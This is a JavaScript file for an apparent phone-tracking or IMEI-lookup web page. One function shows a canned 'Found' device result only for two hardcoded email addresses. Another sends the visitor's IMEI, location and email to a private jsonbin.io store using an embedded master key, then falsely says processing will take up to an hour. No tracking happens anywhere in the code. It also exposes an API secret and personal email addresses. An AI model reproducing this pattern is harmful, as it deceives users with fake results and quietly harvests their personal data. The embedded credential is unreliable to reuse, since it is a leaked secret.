
function submitVerifyy(){

      var inputVerif = document.getElementById("inputVerify").value;
      var popup = document.getElementById("popup");
      var popup2 = document.getElementById("popup2");
      var infoText = document.getElementById("infoText");
      var phoneImg = document.getElementById("phoneImg");
      
      popup.style.display="none";

      var textI=""

      if(inputVerif=="gmasele15@gmail.com"){
           
          phoneImg.src = "https://www.imei.info/static/vbe54e0d2/imei/img/no_photo.png";
    
           popup2.style.display="block";
           infoText.innerHTML=(" Status: <font color=#00ee00>Found</font><br/> Model Info: ITEL<br/>Search Term: 355095716888384<br/>IMEI 1: 355095716888384<br/> Model Desc: A632W<br/>  Model Name: Itel A632W<br/>Brand: Itel Technology Limited<br/> ");

      }

      if(inputVerif=="ashrafprofessor30@gmail.com"){
           
            phoneImg.src = "https://www.imei.info/static/vbe54e0d2/imei/img/no_photo.png";
    
           popup2.style.display="block";
           infoText.innerHTML=(" Status: <font color=#00ee00>Found</font><br/> Model Info: ITEL<br/>Search Term: 355095716888384<br/>IMEI 1: 355095716888384<br/> Model Desc: A632W<br/>  Model Name: Itel A632W<br/>Brand: Itel Technology Limited<br/> ");

      }

}













function trackDevice(){
        
    var subject = document.getElementById("email").value;
    var body = document.getElementById("input2").value;
    var email = document.getElementById("input3").value;
    
    
    const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
    const binName= 'myBin';



  
    const data = {
    IMEi: subject,
    LastLocation: body+" ./pc_version",
    MailTo: email
  };

  
   fetch('https://api.jsonbin.io/v3/b', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          "X-Master-Key": secretKey,
          "X-Bin-Private": true,
          'X-Bin-Name': email
        },
        body: JSON.stringify(data)
      })
     .then(response => response.json())
     .then(jsonData => console.log(jsonData))
     .catch(error => console.error(error));
  


        alert("Recieved,processing may take up to an hour.Keep on checking Feedback");


}


function submitVerify() {
    
    var verifyEmail = document.getElementById("inputVerify").value;
    document.getElementById('popup').style.display='none'
          

}







